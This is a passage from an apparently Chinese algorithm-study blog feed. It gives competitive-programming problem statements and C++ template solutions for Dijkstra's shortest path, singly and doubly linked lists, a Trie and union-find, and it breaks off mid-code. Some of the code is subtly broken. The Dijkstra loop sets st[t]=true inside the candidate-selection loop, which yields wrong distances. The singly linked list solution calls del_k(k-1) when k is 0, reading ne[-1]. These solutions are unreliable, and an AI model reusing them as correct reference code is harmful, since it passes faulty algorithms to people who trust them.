号点，则输出 −1。</p><p>输入格式</p><p>第一行包含整数 n 和 m。</p><p>接下来 m 行每行包含三个整数 x,y,z，表示存在一条从点 x 到点 y 的有向边，边长为 z。</p><p>输出格式</p><p>输出一个整数，表示 1 号点到 n 号点的最短距离。</p><p>如果路径不存在，则输出 −1。</p><p>数据范围</p><p>1≤n≤500<br>1≤m≤1e5<br>图中涉及边长均不超过10000。</p><p>输入样例：</p><p>3 3<br>1 2 2<br>2 3 1<br>1 3 4<br>输出样例：</p><p>3</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">510</span>;<br><br><span class="hljs-type">int</span> n,m;<br><span class="hljs-comment">//用邻接矩阵存储图（因为点的个数少</span><br><span class="hljs-type">int</span> g[N][N];<br><span class="hljs-comment">//1到i点的最短距离</span><br><span class="hljs-type">int</span> dist[N];<br><span class="hljs-comment">//st[]表示加入是否确认最短路</span><br><span class="hljs-type">bool</span> st[N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">dijkstra</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">memset</span>(dist,<span class="hljs-number">0x3f</span>,<span class="hljs-keyword">sizeof</span> dist);<br>dist[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span>;<br><br><br><span class="hljs-comment">//循环n次，因为每次加进来一个点</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<br><br><span class="hljs-type">int</span> t=<span class="hljs-number">-1</span>;<br><span class="hljs-comment">//遍历所有没有确认的点</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)&#123; <br><span class="hljs-keyword">if</span>(!st[j]&amp;&amp;(t==<span class="hljs-number">-1</span>||dist[t]&gt;dist[j]))&#123;<br>t=j;<br>&#125;<br>st[t]=<span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)&#123;<br>dist[j]=<span class="hljs-built_in">min</span>(dist[j],dist[t]+g[t][j]);<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(dist[n]==<span class="hljs-number">0x3f3f3f3f</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">return</span> dist[n];<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);<br><span class="hljs-comment">//这里相当于初始化邻接矩阵的全部值为“无穷大”</span><br><span class="hljs-built_in">memset</span>(g,<span class="hljs-number">0x3f</span>,<span class="hljs-keyword">sizeof</span> g);<br><br><span class="hljs-keyword">while</span>(m--)&#123;<br><span class="hljs-type">int</span> a,b,c;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d%d&quot;</span>,&amp;a,&amp;b,&amp;c);<br><span class="hljs-comment">//对重边取最小的存</span><br>g[a][b]=<span class="hljs-built_in">min</span>(g[a][b],c);<br>&#125;<br><br><span class="hljs-type">int</span> t=<span class="hljs-built_in">dijkstra</span>();<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,t);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据结构</title>
    <link href="/post/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.html"/>
    <url>/post/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.html</url>
    
    <content type="html"><![CDATA[<h1 id="1-单链表"><a href="#1-单链表" class="headerlink" title="1.单链表"></a>1.单链表</h1><p>用途：单链表-&gt;邻接表-&gt;图/树</p><p>方法：用e[N]表示节点的值，ne[N]表示对应节点指向的点，空节点用-1表示</p><p>模板基操：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">100010</span>;<br><br><br><span class="hljs-comment">//head 表示头结点下标</span><br><span class="hljs-comment">//e[i] 表示i结点的值</span><br><span class="hljs-comment">//ne[i] 表示i结点的next指针</span><br><span class="hljs-comment">//idx 表示当前用到了哪个点</span><br><span class="hljs-type">int</span> e[N],ne[N],head,idx;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span>&#123;<br>head=<span class="hljs-number">-1</span>;<span class="hljs-comment">//初始化头指针指向空结点</span><br>idx=<span class="hljs-number">0</span>;<span class="hljs-comment">//此时存储单元未使用，idx指向0</span><br>&#125;<br><br><span class="hljs-comment">//在头结点插入</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add_head</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span>&#123;<br>e[idx]=x;<br>ne[idx]=head;<br>head=idx;<br>idx++;<br>&#125;<br><br><span class="hljs-comment">//在k节点后插入</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add_k</span><span class="hljs-params">(<span class="hljs-type">int</span> k,<span class="hljs-type">int</span> x)</span></span>&#123;<br>e[idx]=x;<br>ne[idx]=ne[k];<br>ne[k]=idx;<br>idx++;<br>&#125;<br><span class="hljs-comment">//删除k节点后的一个结点</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">del_k</span><span class="hljs-params">(<span class="hljs-type">int</span> k)</span></span>&#123;<br>ne[k]=ne[ne[k]];<br>&#125;<br><br><span class="hljs-comment">//将头结点删除</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">del_head</span><span class="hljs-params">()</span></span>&#123;<br>head=ne[head];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><p>实现一个单链表，链表初始为空，支持三种操作：</p><p>向链表头插入一个数；<br>删除第 k 个插入的数后面的数；<br>在第 k 个插入的数后插入一个数。<br>现在要对该链表进行 M 次操作，进行完所有操作后，从头到尾输出整个链表。</p><p><strong>注意:题目中第 k 个插入的数并不是指当前链表的第 k 个数。例如操作过程中一共插入了 n 个数，则按照插入的时间顺序，这 n 个数依次为：第 1 个插入的数，第 2 个插入的数，…第 n 个插入的数。</strong></p><p>输入格式<br>第一行包含整数 M，表示操作次数。</p><p>接下来 M 行，每行包含一个操作命令，操作命令可能为以下几种：</p><p>H x，表示向链表头插入一个数 x。<br>D k，表示删除第 k 个插入的数后面的数（当 k 为 0 时，表示删除头结点）。<br>I k x，表示在第 k 个插入的数后面插入一个数 x（此操作中 k 均大于 0）。<br>输出格式<br>共一行，将整个链表从头到尾输出。</p><p>数据范围<br>1≤M≤100000<br>所有操作保证合法。</p><p>输入样例：<br>10<br>H 9<br>I 1 1<br>D 1<br>D 0<br>H 6<br>I 3 6<br>I 4 5<br>I 4 5<br>I 3 4<br>D 6<br>输出样例：<br>6 4 6 5</p><h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">100010</span>;<br><br><br><span class="hljs-comment">//head 表示头结点下标</span><br><span class="hljs-comment">//e[i] 表示i结点的值</span><br><span class="hljs-comment">//ne[i] 表示i结点的next指针</span><br><span class="hljs-comment">//idx 表示当前用到了哪个点</span><br><span class="hljs-type">int</span> e[N],ne[N],head,idx;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span>&#123;<br>head=<span class="hljs-number">-1</span>;<span class="hljs-comment">//初始化头指针指向空结点</span><br>idx=<span class="hljs-number">0</span>;<span class="hljs-comment">//此时存储单元未使用，idx指向0</span><br>&#125;<br><br><span class="hljs-comment">//在头结点插入</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add_head</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span>&#123;<br>e[idx]=x;<br>ne[idx]=head;<br>head=idx;<br>idx++;<br>&#125;<br><br><span class="hljs-comment">//在k节点后插入</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add_k</span><span class="hljs-params">(<span class="hljs-type">int</span> k,<span class="hljs-type">int</span> x)</span></span>&#123;<br>e[idx]=x;<br>ne[idx]=ne[k];<br>ne[k]=idx;<br>idx++;<br>&#125;<br><span class="hljs-comment">//删除k节点后的一个结点</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">del_k</span><span class="hljs-params">(<span class="hljs-type">int</span> k)</span></span>&#123;<br>ne[k]=ne[ne[k]];<br>&#125;<br><br><span class="hljs-comment">//将头结点删除</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">del_head</span><span class="hljs-params">()</span></span>&#123;<br>head=ne[head];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">init</span>();<br><span class="hljs-type">int</span> M;<br>cin&gt;&gt;M;<br><br><span class="hljs-comment">//操作</span><br><span class="hljs-keyword">while</span>(M--)&#123;<br><span class="hljs-type">char</span> ch;<br><span class="hljs-type">int</span> x,k;<br>cin&gt;&gt;ch;<br><span class="hljs-keyword">if</span>(ch==<span class="hljs-string">&#x27;H&#x27;</span>)&#123;<br>cin&gt;&gt;x;<br><span class="hljs-built_in">add_head</span>(x);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(ch==<span class="hljs-string">&#x27;D&#x27;</span>)&#123;<br>cin&gt;&gt;k;<br><span class="hljs-built_in">del_k</span>(k<span class="hljs-number">-1</span>);   <span class="hljs-comment">//这里要传入k-1,因为是以0为头结点的</span><br><span class="hljs-keyword">if</span>(k==<span class="hljs-number">0</span>) <span class="hljs-built_in">del_head</span>(); <br><br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(ch==<span class="hljs-string">&#x27;I&#x27;</span>)&#123;<br>cin&gt;&gt;k&gt;&gt;x;<br><span class="hljs-built_in">add_k</span>(k<span class="hljs-number">-1</span>,x);<br>&#125;<br><br>&#125;<br><br><span class="hljs-comment">//输出</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=head;i!=<span class="hljs-number">-1</span>;i=ne[i])&#123;<br>cout&lt;&lt;e[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="2-双链表"><a href="#2-双链表" class="headerlink" title="2.双链表"></a>2.双链表</h1><h2 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h2><p>实现一个双链表，双链表初始为空，支持 5 种操作：</p><p>在最左侧插入一个数；<br>在最右侧插入一个数；<br>将第 k 个插入的数删除；<br>在第 k 个插入的数左侧插入一个数；<br>在第 k 个插入的数右侧插入一个数<br>现在要对该链表进行 M 次操作，进行完所有操作后，从左到右输出整个链表。</p><p><strong>注意:题目中第 k 个插入的数并不是指当前链表的第 k 个数。例如操作过程中一共插入了 n 个数，则按照插入的时间顺序，这 n 个数依次为：第 1 个插入的数，第 2 个插入的数，…第 n 个插入的数。</strong></p><p>输入格式<br>第一行包含整数 M，表示操作次数。</p><p>接下来 M 行，每行包含一个操作命令，操作命令可能为以下几种：</p><p>L x，表示在链表的最左端插入数 x。<br>R x，表示在链表的最右端插入数 x。<br>D k，表示将第 k 个插入的数删除。<br>IL k x，表示在第 k 个插入的数左侧插入一个数。<br>IR k x，表示在第 k 个插入的数右侧插入一个数。<br>输出格式<br>共一行，将整个链表从左到右输出。</p><p>数据范围<br>1≤M≤100000<br>所有操作保证合法。</p><p>输入样例：<br>10<br>R 7<br>D 1<br>L 3<br>IL 2 10<br>D 3<br>IL 2 7<br>L 8<br>R 9<br>IL 4 7<br>IR 2 2<br>输出样例：<br>8 7 7 3 2 9</p><h2 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">100060</span>;<br><span class="hljs-type">int</span> e[N],l[N],r[N],idx;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-comment">//0,1代表左右两个端点</span><br>r[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>;<br>l[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span>;<br>idx=<span class="hljs-number">2</span>;<br>&#125;<br><br><span class="hljs-comment">//在第k结点后插入x;</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add_k</span><span class="hljs-params">(<span class="hljs-type">int</span> k,<span class="hljs-type">int</span> x)</span></span>&#123;<br>e[idx]=x;<br>r[idx]=r[k];<br>l[idx]=k;<br>l[r[k]]=idx;<br>r[k]=idx;<br>idx++;<br>&#125;<br><br><span class="hljs-comment">//删除第k个点</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">del_k</span><span class="hljs-params">(<span class="hljs-type">int</span> k)</span></span>&#123;<br>r[l[k]]=r[k];<br>l[r[k]]=l[k];<br><span class="hljs-comment">//l[r[r[k]]]=k;</span><br><span class="hljs-comment">//r[k]=r[r[k]];</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">init</span>();<br><span class="hljs-type">int</span> M;<br>cin&gt;&gt;M;<br><br><span class="hljs-keyword">while</span>(M--)&#123;<br>string op;<br>cin&gt;&gt;op;<br><span class="hljs-type">int</span> x,k;<br><span class="hljs-keyword">if</span>(op==<span class="hljs-string">&quot;L&quot;</span>)&#123;<br>cin&gt;&gt;x;<br><span class="hljs-built_in">add_k</span>(<span class="hljs-number">0</span>,x);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(op==<span class="hljs-string">&quot;R&quot;</span>)&#123;<br>cin&gt;&gt;x;<br><span class="hljs-built_in">add_k</span>(l[<span class="hljs-number">1</span>],x);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(op==<span class="hljs-string">&quot;D&quot;</span>)&#123;<br>cin&gt;&gt;k;<br><span class="hljs-built_in">del_k</span>(k+<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(op==<span class="hljs-string">&quot;IL&quot;</span>)&#123;<br>cin&gt;&gt;k&gt;&gt;x;<br><span class="hljs-built_in">add_k</span>(l[k+<span class="hljs-number">1</span>],x);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(op==<span class="hljs-string">&quot;IR&quot;</span>)&#123;<br>cin&gt;&gt;k&gt;&gt;x;<br><span class="hljs-built_in">add_k</span>(k+<span class="hljs-number">1</span>,x);<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//输出</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=r[<span class="hljs-number">0</span>];i!=<span class="hljs-number">1</span>;i=r[i])&#123;<br>cout&lt;&lt;e[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="3-单调栈"><a href="#3-单调栈" class="headerlink" title="3.单调栈"></a>3.单调栈</h1><h1 id="4-单调队列"><a href="#4-单调队列" class="headerlink" title="4.单调队列"></a>4.单调队列</h1><h1 id="5-kmp"><a href="#5-kmp" class="headerlink" title="5.kmp"></a>5.kmp</h1><h1 id="6-Trie树"><a href="#6-Trie树" class="headerlink" title="6.Trie树"></a>6.Trie树</h1><p>高效的存储和查找字符串集合的数据结构</p><p>一般用到Tire树的时候要么都是小写要么都是大写要么都是01等，总之类型不会很多</p><p>Trie树功能：<br><strong>1、<code>插入:</code>向字符串集合插入字符串<br>2、<code>查询:</code>查询某个字符串是否在该字符串集合中（可以在字符串末尾的字符上打上一个标记）<br>3、<code>统计次数:</code>统计某个字符串在该字符串集合中出现的次数<br>4、<code>求最长前缀:</code>求两个字符串的最长公共前缀</strong></p><h2 id="6-1Trie字符串统计"><a href="#6-1Trie字符串统计" class="headerlink" title="6.1Trie字符串统计"></a>6.1Trie字符串统计</h2><p>维护一个字符串集合，支持两种操作：</p><p>I x 向集合中插入一个字符串 x；<br>Q x 询问一个字符串在集合中出现了多少次。<br>共有 N 个操作，输入的字符串总长度不超过 105，字符串仅包含小写英文字母。</p><p>输入格式<br>第一行包含整数 N，表示操作数。</p><p>接下来 N 行，每行包含一个操作指令，指令为 I x 或 Q x 中的一种。</p><p>输出格式<br>对于每个询问指令 Q x，都要输出一个整数作为结果，表示 x 在集合中出现的次数。</p><p>每个结果占一行。</p><p>数据范围<br>1≤N≤2∗104<br>输入样例：<br>5<br>I abc<br>Q abc<br>Q ab<br>I ab<br>Q ab<br>输出样例：<br>1<br>0<br>1</p><p>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">100010</span>;<br><span class="hljs-comment">//son[][]存储子节点的位置，分支最多26条（26个字母）；</span><br><span class="hljs-comment">//cnt[]存储以某节点结尾的字符串个数（同时也起标记作用）</span><br><span class="hljs-comment">//idx表示当前要插入的节点是第几个,每创建一个节点值+1</span><br><span class="hljs-type">int</span>  son[N][<span class="hljs-number">26</span>],idx,cnt[N];<br><span class="hljs-type">char</span> str[N];<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span></span>&#123;<br><span class="hljs-type">int</span> p=<span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;str[i];i++)&#123;<br><span class="hljs-type">int</span> u=str[i]-<span class="hljs-string">&#x27;a&#x27;</span>;<br><span class="hljs-keyword">if</span>(!son[p][u])son[p][u]=++idx;<br>p=son[p][u];<br>&#125;<br>cnt[p]++;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span></span>&#123;<br><span class="hljs-type">int</span> p=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;str[i];i++)&#123;<br><span class="hljs-type">int</span> u=str[i]-<span class="hljs-string">&#x27;a&#x27;</span>;<br><span class="hljs-keyword">if</span>(!son[p][u]) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>p=son[p][u];<br>&#125;<br><br><span class="hljs-keyword">return</span> cnt[p];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> m;<br>cin&gt;&gt;m;<br><span class="hljs-keyword">while</span>(m--)&#123;<br><span class="hljs-type">char</span> op[<span class="hljs-number">2</span>];<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s%s&quot;</span>,op,str);<br><br><span class="hljs-keyword">if</span>(*op==<span class="hljs-string">&#x27;I&#x27;</span>)&#123;<br><span class="hljs-built_in">insert</span>(str);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-type">int</span> x=<span class="hljs-built_in">query</span>(str);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,x);<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="7-并查集"><a href="#7-并查集" class="headerlink" title="7.并查集"></a>7.并查集</h1><p>作用：快速处理1.将两个集合合并2.询问两个元素是否在一个集合中</p><p>基本原理：每个集合用一颗树表示。树根的编号就是整个集合的编号。每个节点存储它的父节点，p[x]表示x的父节点</p><p>问题1：如何判断树根：if(p[x]==x)</p><p>问题2：如何求x的集合编号：while(p[x]!=x) x=p[x]</p><p>问题3：如何合并两个集合：p[x]=y;</p><h2 id="7-1合并集合"><a href="#7-1合并集合" class="headerlink" title="7.1合并集合"></a>7.1合并集合</h2><p>一共有 n 个数，编号是 1∼n，最开始每个数各自在一个集合中。</p><p>现在要进行 m 个操作，操作共有两种：</p><p>M a b，将编号为 a 和 b 的两个数所在的集合合并，如果两个数已经在同一个集合中，则忽略这个操作；<br>Q a b，询问编号为 a 和 b 的两个数是否在同一个集合中；<br>输入格式</p><p>第一行输入整数 n 和 m。</p><p>接下来 m 行，每行包含一个操作指令，指令为 M a b 或 Q a b 中的一种。</p><p>输出格式</p><p>对于每个询问指令 Q a b，都要输出一个结果，如果 a 和 b 在同一集合内，则输出 Yes，否则输出 No。</p><p>每个结果占一行。</p><p>数据范围</p><p>1≤n,m≤1e5</p><p>输入样例：</p><p>4 5<br>M 1 2<br>M 3 4<br>Q 1 2<br>Q 1 3<br>Q 3 4<br>输出样例：</p><p>Yes<br>No<br>Yes</p><p>代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 